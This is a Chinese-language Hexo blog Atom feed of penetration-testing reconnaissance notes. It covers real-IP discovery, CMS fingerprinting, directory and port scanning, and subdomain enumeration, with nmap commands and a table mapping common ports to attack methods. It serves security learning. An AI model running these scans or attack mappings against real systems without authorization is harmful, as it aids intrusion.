<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>披着羊皮的狼</title>
  
  
  <link href="http://zzqsmile.top/atom.xml" rel="self"/>
  
  <link href="http://zzqsmile.top/"/>
  <updated>2020-10-18T07:23:08.450Z</updated>
  <id>http://zzqsmile.top/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>寻找真实IP</title>
    <link href="http://zzqsmile.top/2020/10/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP/"/>
    <id>http://zzqsmile.top/2020/10/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP/</id>
    <published>2020-10-18T12:00:00.000Z</published>
    <updated>2020-10-18T07:23:08.450Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><ul><li>1.多地ping</li></ul><blockquote><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></p></blockquote><ul><li><p>2.查询历史DNS解析记录</p><ul><li><p>1.DNSDB</p><blockquote><p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p></blockquote></li><li><p>2.微步在线</p><blockquote><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p></blockquote></li><li><p>3.Ipip.net</p><blockquote><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p></blockquote></li></ul></li><li><p>3.phpinfo</p></li></ul><blockquote><p>如果目标网站存在phpinfo泄露等，可以在phpinfo中的SERVER_ADDR或_SERVER[“SERVER_ADDR”]找到真实ip</p></blockquote><ul><li><p>4.子域名</p></li><li><p>5.网络空间引擎搜索</p></li></ul><blockquote><p>shodan、FOFA、zoomeye </p></blockquote><ul><li>6.网站SSRF漏洞 </li></ul><blockquote><p>服务器主动向外发起连接，找到真实IP地址</p></blockquote><ul><li>7.目标网站APP应用</li></ul><blockquote><p>如果目标网站有自己的App，可以尝试利用Fiddler或Burp Suite抓取App的请求，从里面找到目标的真实IP。</p></blockquote><ul><li>8.内部邮箱源</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;1.多地ping&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://ping.chinaz.com/&quot;&gt;http://ping.chinaz.com/&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;ht</summary>
      
    
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>指纹识别</title>
    <link href="http://zzqsmile.top/2020/10/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/"/>
    <id>http://zzqsmile.top/2020/10/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/</id>
    <published>2020-10-18T12:00:00.000Z</published>
    <updated>2020-10-18T07:36:17.764Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><h4 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h4><ul><li>Wappalyzer</li></ul><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><blockquote><p>常用指纹识别工具有：御剑Web指纹识别、WhatWeb、Test404轻量CMS指纹识别+v2.1、椰树等，可以快速识别一些主流CMS</p></blockquote><ul><li><p>Github项目</p><ul><li>CMSeeK<blockquote><p><a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a></p></blockquote></li><li>CMSmap<blockquote><p><a href="https://github.com/Dionach/CMSmap">https://github.com/Dionach/CMSmap</a></p></blockquote></li><li>ACMSDiscovery<blockquote><p><a href="https://github.com/aedoo/ACMSDiscovery">https://github.com/aedoo/ACMSDiscovery</a></p></blockquote></li><li>TideFinger<blockquote><p><a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></p></blockquote></li><li>AngelSword<blockquote><p><a href="https://github.com/Lucifer1993/AngelSword">https://github.com/Lucifer1993/AngelSword</a></p></blockquote></li></ul></li></ul><h4 id="第三方平台"><a href="#第三方平台" class="headerlink" title="第三方平台"></a>第三方平台</h4><ul><li>BugScaner</li></ul><blockquote><p><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p></blockquote><ul><li>数字观星</li></ul><blockquote><p><a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a></p></blockquote><ul><li>云悉</li></ul><blockquote><p><a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a></p></blockquote><ul><li>潮汐指纹</li></ul><blockquote><p><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;指纹识别&quot;&gt;&lt;a href=&quot;#指纹识别&quot; class=&quot;headerlink&quot; title=&quot;指纹识别&quot;&gt;&lt;/a&gt;指纹识别&lt;/h3&gt;&lt;h4 id=&quot;浏览器插件&quot;&gt;&lt;a href=&quot;#浏览器插件&quot; class=&quot;headerl</summary>
      
    
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>旁站和C段</title>
    <link href="http://zzqsmile.top/2020/10/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E6%97%81%E7%AB%99%E5%92%8CC%E6%AE%B5/"/>
    <id>http://zzqsmile.top/2020/10/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E6%97%81%E7%AB%99%E5%92%8CC%E6%AE%B5/</id>
    <published>2020-10-18T12:00:00.000Z</published>
    <updated>2020-10-18T07:24:12.470Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><ul><li>1.站长之家</li></ul><p>同ip网站查询</p><blockquote><p><a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></p></blockquote><ul><li><p>2.网络空间搜索引擎</p></li><li><p>3.Nmap,Msscan扫描等</p></li></ul><p>例如：</p><blockquote><p>nmap -p 80,443,8000,8080 -Pn 192.168.0.0/24</p></blockquote><p>常见端口表:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21,22,23,80-90,161,389,443,445,873,1099,1433,1521,1900,2082,2083,2222,2601,2604,3128,3306,3311,3312,3389,4440,4848,5432,5560,5900,5901,5902,6082,6379,7001-7010,7778,8080-8090,8649,8888,9000,9200,10000,11211,27017,28017,50000,50030,50060</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;1.站长之家&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;同ip网站查询&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://stool.chinaz.com/same&quot;&gt;http://stool.chinaz.com/</summary>
      
    
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>目录扫描</title>
    <link href="http://zzqsmile.top/2020/10/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/"/>
    <id>http://zzqsmile.top/2020/10/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/</id>
    <published>2020-10-18T12:00:00.000Z</published>
    <updated>2020-10-18T07:41:14.866Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><ul><li>1、御剑</li></ul><blockquote><p><a href="https://www.fujieace.com/hacker/tools/yujian.html">https://www.fujieace.com/hacker/tools/yujian.html</a></p></blockquote><ul><li>2、dirmap</li></ul><blockquote><p><a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a></p></blockquote><ul><li>3、dirsearch</li></ul><blockquote><p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p></blockquote><ul><li><p>4、github搜索</p></li><li><p>5、7kbstorm</p></li></ul><blockquote><p><a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p></blockquote><ul><li>6、bbscan</li></ul><blockquote><p><a href="https://github.com/lijiejie/BBScan">https://github.com/lijiejie/BBScan</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;目录扫描&quot;&gt;&lt;a href=&quot;#目录扫描&quot; class=&quot;headerlink&quot; title=&quot;目录扫描&quot;&gt;&lt;/a&gt;目录扫描&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;1、御剑&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a hr</summary>
      
    
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>端口扫描</title>
    <link href="http://zzqsmile.top/2020/10/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    <id>http://zzqsmile.top/2020/10/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</id>
    <published>2020-10-18T12:00:00.000Z</published>
    <updated>2020-10-18T07:51:26.695Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ul><li><p>1.nmap</p></li><li><p>2.在线端口检测</p></li></ul><blockquote><p><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a></p></blockquote><ul><li><p>3.端口扫描器</p><ul><li>御剑高速端口扫描器</li></ul><blockquote><p><a href="https://pan.baidu.com/share/init?surl=Uh-FWsXOUlVUM3ZOpRWoYQ">https://pan.baidu.com/share/init?surl=Uh-FWsXOUlVUM3ZOpRWoYQ</a> 提取码: czne</p></blockquote><p>常见端口及对应服务和攻击方式整理如下:</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/ffq88LJJ8oPhzuqa2g06cq4ibd8KROg1zuIyD3k7JqF6OYbvITretWgKlVPP7AbddZM3MdQRcTccjTgOyM9GZgw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p></li></ul><h3 id="常用的端口利用及解析总结"><a href="#常用的端口利用及解析总结" class="headerlink" title="常用的端口利用及解析总结"></a>常用的端口利用及解析总结</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">端口：21 服务：FTP&#x2F;TFTP&#x2F;VSFTPD        总结：爆破&#x2F;嗅探&#x2F;溢出&#x2F;后门</span><br><span class="line">端口：22 服务：ssh远程连接              总结：爆破&#x2F;openssh漏洞</span><br><span class="line">端口：23 服务：Telnet远程连接           总结：爆破&#x2F;嗅探&#x2F;弱口令</span><br><span class="line">端口：25 服务：SMTP邮件服务             总结：邮件伪造</span><br><span class="line">端口：53 服务：DNS域名解析系统           总结：域传送&#x2F;劫持&#x2F;缓存投毒&#x2F;欺骗</span><br><span class="line">端口：67&#x2F;68 服务：dhcp服务              总结：劫持&#x2F;欺骗</span><br><span class="line">端口：110 服务：pop3                  总结：爆破&#x2F;嗅探</span><br><span class="line">端口：139 服务：Samba服务             总结：爆破&#x2F;未授权访问&#x2F;远程命令执行</span><br><span class="line">端口：143 服务：Imap协议                 总结：爆破161SNMP协议爆破&#x2F;搜集目标内网信息</span><br><span class="line">端口：389 服务：Ldap目录访问协议         总结：注入&#x2F;未授权访问&#x2F;弱口令</span><br><span class="line">端口：445 服务：smb                  总结：ms17-010&#x2F;端口溢出</span><br><span class="line">端口：512&#x2F;513&#x2F;514 服务：Linux Rexec服务     总结：爆破&#x2F;Rlogin登陆</span><br><span class="line">端口：873 服务：Rsync服务                总结：文件上传&#x2F;未授权访问</span><br><span class="line">端口：1080 服务：socket                 总结：爆破</span><br><span class="line">端口：1352 服务：Lotus domino邮件服务    总结：爆破&#x2F;信息泄漏</span><br><span class="line">端口：1433 服务：mssql                  总结：爆破&#x2F;注入&#x2F;SA弱口令</span><br><span class="line">端口：1521 服务：oracle            总结：爆破&#x2F;注入&#x2F;TNS爆破&#x2F;反弹shell2049Nfs服务配置不当</span><br><span class="line">端口：2181 服务：zookeeper服务        总结：未授权访问</span><br><span class="line">端口：2375 服务：docker remote api    总结：未授权访问</span><br><span class="line">端口：3306 服务：mysql                    总结：爆破&#x2F;注入</span><br><span class="line">端口：3389 服务：Rdp远程桌面链接            总结：爆破&#x2F;shift后门</span><br><span class="line">端口：4848 服务：GlassFish控制台           总结：爆破&#x2F;认证绕过</span><br><span class="line">端口：5000 服务：sybase&#x2F;DB2数据库        总结：爆破&#x2F;注入&#x2F;提权</span><br><span class="line">端口：5432 服务：postgresql        总结：爆破&#x2F;注入&#x2F;缓冲区溢出</span><br><span class="line">端口：5632 服务：pcanywhere服务        总结：抓密码&#x2F;代码执行</span><br><span class="line">端口：5900 服务：vnc            总结：爆破&#x2F;认证绕过</span><br><span class="line">端口：6379 服务：Redis数据库              总结：未授权访问&#x2F;爆破</span><br><span class="line">端口：7001&#x2F;7002 服务：weblogic           总结：java反序列化&#x2F;控制台弱口令</span><br><span class="line">端口：80&#x2F;443 服务：http&#x2F;https            总结：web应用漏洞&#x2F;心脏滴血</span><br><span class="line">端口：8069 服务：zabbix服务               总结：远程命令执行&#x2F;注入</span><br><span class="line">端口：8161 服务：activemq                总结：弱口令&#x2F;写文件</span><br><span class="line">端口：8080&#x2F;8089 服务：Jboss&#x2F;Tomcat&#x2F;Resin 总结：爆破&#x2F;PUT文件上传&#x2F;反序列化</span><br><span class="line">端口：8083&#x2F;8086 服务：influxDB           总结：未授权访问</span><br><span class="line">端口：9000 服务：fastcgi                 总结：远程命令执行</span><br><span class="line">端口：9090 服务：Websphere               总结：控制台爆破&#x2F;java反序列化&#x2F;弱口令</span><br><span class="line">端口：9200&#x2F;9300 服务：elasticsearch      总结：远程代码执行</span><br><span class="line">端口：11211 服务：memcached              总结：未授权访问</span><br><span class="line">端口：27017&#x2F;27018 服务：mongodb          总结：未授权访问&#x2F;爆破</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h3 id=&quot;端口扫描&quot;&gt;&lt;a href=&quot;#端口扫描&quot; class=&quot;headerlink&quot; title=&quot;端口扫描&quot;&gt;&lt;/a&gt;端口扫描&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;1.nmap&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;2.在线端口检测&lt;/</summary>
      
    
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>参考</title>
    <link href="http://zzqsmile.top/2020/10/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%8F%82%E8%80%83/"/>
    <id>http://zzqsmile.top/2020/10/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%8F%82%E8%80%83/</id>
    <published>2020-10-18T12:00:00.000Z</published>
    <updated>2020-10-18T07:52:55.904Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>更多参考</p><ul><li>1</li></ul><blockquote><p><a href="https://qftm.github.io/Information_Collection_Handbook/">https://qftm.github.io/Information_Collection_Handbook/</a></p></blockquote><ul><li>2</li></ul><blockquote><p><a href="https://mp.weixin.qq.com/s/UA7nPAKXq19LlPz1zgdZ0w">https://mp.weixin.qq.com/s/UA7nPAKXq19LlPz1zgdZ0w</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;p&gt;更多参考&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://qftm.github.io/Information_Collection_Handbook/&quot;&gt;https</summary>
      
    
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>whois信息查询</title>
    <link href="http://zzqsmile.top/2020/10/15/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/whois%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2/"/>
    <id>http://zzqsmile.top/2020/10/15/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/whois%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2/</id>
    <published>2020-10-15T12:00:00.000Z</published>
    <updated>2020-10-15T13:42:43.668Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><ul><li>1.站长之家域名WHOIS信息查询地址</li></ul><blockquote><p><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p></blockquote><ul><li>2.爱站网域名WHOIS信息查询地址</li></ul><blockquote><p><a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p></blockquote><ul><li>3.腾讯云域名WHOIS信息查询地址</li></ul><blockquote><p><a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a></p></blockquote><ul><li>4.美橙互联域名WHOIS信息查询地址</li></ul><blockquote><p><a href="https://whois.cndns.com/">https://whois.cndns.com/</a></p></blockquote><ul><li>5.爱名网域名WHOIS信息查询地址</li></ul><blockquote><p><a href="https://www.22.cn/domain/">https://www.22.cn/domain/</a></p></blockquote><ul><li>6.易名网域名WHOIS信息查询地址</li></ul><blockquote><p><a href="https://whois.ename.net/">https://whois.ename.net/</a></p></blockquote><ul><li>7.中国万网域名WHOIS信息查询地址</li></ul><blockquote><p><a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></p></blockquote><ul><li>8.西部数码域名WHOIS信息查询地址</li></ul><blockquote><p><a href="https://whois.west.cn/">https://whois.west.cn/</a></p></blockquote><ul><li>9.新网域名WHOIS信息查询地址</li></ul><blockquote><p><a href="http://whois.xinnet.com/domain/whois/index.jsp">http://whois.xinnet.com/domain/whois/index.jsp</a></p></blockquote><ul><li>10.纳网域名WHOIS信息查询地址</li></ul><blockquote><p><a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a></p></blockquote><ul><li>11.中资源域名WHOIS信息查询地址</li></ul><blockquote><p><a href="https://www.zzy.cn/domain/whois.html">https://www.zzy.cn/domain/whois.html</a></p></blockquote><ul><li>12.三五互联域名WHOIS信息查询地址</li></ul><blockquote><p><a href="https://cp.35.com/chinese/whois.php">https://cp.35.com/chinese/whois.php</a></p></blockquote><ul><li>13.新网互联域名WHOIS信息查询地址</li></ul><blockquote><p><a href="http://www.dns.com.cn/show/domain/whois/index.do">http://www.dns.com.cn/show/domain/whois/index.do</a></p></blockquote><ul><li>14.国外WHOIS信息查询地址</li></ul><blockquote><p><a href="https://who.is/">https://who.is/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;1.站长之家域名WHOIS信息查询地址&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://whois.chinaz.com/&quot;&gt;http://whois.chinaz.com/&lt;/a&gt;&lt;/</summary>
      
    
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>子域名收集</title>
    <link href="http://zzqsmile.top/2020/10/15/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86/"/>
    <id>http://zzqsmile.top/2020/10/15/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86/</id>
    <published>2020-10-15T12:00:00.000Z</published>
    <updated>2020-10-15T13:42:22.418Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h4 id="在线收集"><a href="#在线收集" class="headerlink" title="在线收集"></a>在线收集</h4><ul><li>phpinfo</li></ul><blockquote><p><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p></blockquote><ul><li>t1h2ua </li></ul><blockquote><p><a href="https://www.t1h2ua.cn/tools/">https://www.t1h2ua.cn/tools/</a></p></blockquote><ul><li>hackertarget</li></ul><blockquote><p><a href="https://hackertarget.com/find-dns-host-records/">https://hackertarget.com/find-dns-host-records/</a></p></blockquote><ul><li>ip138</li></ul><blockquote><p><a href="https://site.ip138.com/">https://site.ip138.com/</a></p></blockquote><ul><li>站长工具</li></ul><blockquote><p><a href="http://tool.chinaz.com/subdomain/?domain=">http://tool.chinaz.com/subdomain/?domain=</a></p></blockquote><ul><li>dnsdumpster</li></ul><blockquote><p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p></blockquote><ul><li>zcjun</li></ul><blockquote><p><a href="http://z.zcjun.com/">http://z.zcjun.com/</a></p></blockquote><h4 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h4><ul><li>fofa.so</li></ul><blockquote><p><a href="https://fofa.so/">https://fofa.so/</a></p></blockquote><ul><li>Google</li></ul><blockquote><p>site:baidu.com</p></blockquote><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><ul><li>1.SubDomainBrute</li></ul><blockquote><p><a href="https://github.com/lijiejie/subDomainsBrute">https://github.com/lijiejie/subDomainsBrute</a></p></blockquote><ul><li>2.Sublist3r</li></ul><blockquote><p><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></p></blockquote><ul><li>3.OneForAll</li></ul><blockquote><p><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 oneforall.py --target&#x3D;target.com run</span><br><span class="line"> </span><br></pre></td></tr></table></figure><ul><li>4.Layer子域名挖掘机4.2（使用方便，界面整洁）：</li></ul><blockquote><blockquote><p><a href="https://www.webshell.cc/6384.html">https://www.webshell.cc/6384.html</a></p></blockquote></blockquote><ul><li>5.Layer子域名挖掘机5.0（使用方便，界面整洁）：</li></ul><blockquote><p><a href="https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg">https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg</a> &gt; 提取码：uk1j</p></blockquote><h4 id="证书透明度公开日志枚举"><a href="#证书透明度公开日志枚举" class="headerlink" title="证书透明度公开日志枚举"></a>证书透明度公开日志枚举</h4><h5 id="在线"><a href="#在线" class="headerlink" title="在线"></a>在线</h5><ul><li>crt.sh</li></ul><blockquote><p><a href="https://crt.sh/?q=baidu.com">https://crt.sh/?q=baidu.com</a></p></blockquote><ul><li>censys</li></ul><blockquote><p><a href="https://www.censys.io/certificates?q=baidu.com">https://www.censys.io/certificates?q=baidu.com</a></p></blockquote><ul><li>myssl</li></ul><blockquote><p><a href="https://myssl.com/">https://myssl.com/</a></p></blockquote><h5 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h5><ul><li>Findomain</li></ul><blockquote><p><a href="https://github.com/Edu4rdSHL/findomain">https://github.com/Edu4rdSHL/findomain</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">子域名收集：findomain -t target.com</span><br><span class="line"></span><br><span class="line">使用所有API搜索子域并将数据导出到CSV文件：findomain -t target.com -a -o csv </span><br></pre></td></tr></table></figure><h4 id="DNS历史解析"><a href="#DNS历史解析" class="headerlink" title="DNS历史解析"></a>DNS历史解析</h4><ul><li>dnsdb</li></ul><blockquote><p><a href="https://www.dnsdb.io/">https://www.dnsdb.io</a></p></blockquote><ul><li>viewdns</li></ul><blockquote><p><a href="https://viewdns.info/">https://viewdns.info/</a></p></blockquote><h4 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h4><ul><li>nmap检测脚本<code>dns-zone-transfer</code></li></ul><blockquote><p>nmap –script dns-zone-transfer –script-args dns-zone-transfer.domain=xxx.edu.cn -p 53 -Pn dns.xxx.edu.cn</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--script dns-zone-transfer 表示加载nmap漏洞检测脚本dns-zone-transfer.nse，扩展名.nse可省略</span><br><span class="line"></span><br><span class="line">--script-args dns-zone-transfer.domain&#x3D;xxx.edu.cn 向脚本传递参数，设置列出某个域中的所有域名</span><br><span class="line"></span><br><span class="line">-p 53 设置扫描53端口</span><br><span class="line"></span><br><span class="line">-Pn 设置通过Ping发现主机是否存活</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h4 id=&quot;在线收集&quot;&gt;&lt;a href=&quot;#在线收集&quot; class=&quot;headerlink&quot; title=&quot;在线收集&quot;&gt;&lt;/a&gt;在线收集&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;phpinfo&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a</summary>
      
    
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="http://zzqsmile.top/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>备案信息查询</title>
    <link href="http://zzqsmile.top/2020/10/15/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%A4%87%E6%A1%88%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2/"/>
    <id>http://zzqsmile.top/2020/10/15/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%A4%87%E6%A1%88%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2/</id>
    <published>2020-10-15T12:00:00.000Z</published>
    <updated>2020-10-15T13:42:26.632Z</updated>
    
